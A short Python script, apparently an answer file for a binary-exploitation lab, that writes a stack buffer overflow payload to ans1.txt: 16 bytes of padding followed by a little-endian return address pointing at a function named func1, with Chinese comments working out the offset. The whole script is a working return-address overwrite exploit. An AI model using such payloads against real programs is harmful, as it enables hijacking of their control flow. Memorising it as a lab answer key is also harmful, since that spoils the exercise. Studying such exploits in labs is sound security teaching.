import sys

# 【修正】
# 缓冲区在 rbp-8，返回地址在 rbp+8
# 距离 = 8 (buffer) + 8 (saved rbp) = 16
padding_len = 16 

# 目标地址 func1: 0x401216
target_addr = b'\x16\x12\x40\x00\x00\x00\x00\x00'

# 生成 payload
payload = b'A' * padding_len + target_addr

with open('ans1.txt', 'wb') as f:
    f.write(payload)

print(f"Payload generated! Length: {len(payload)}")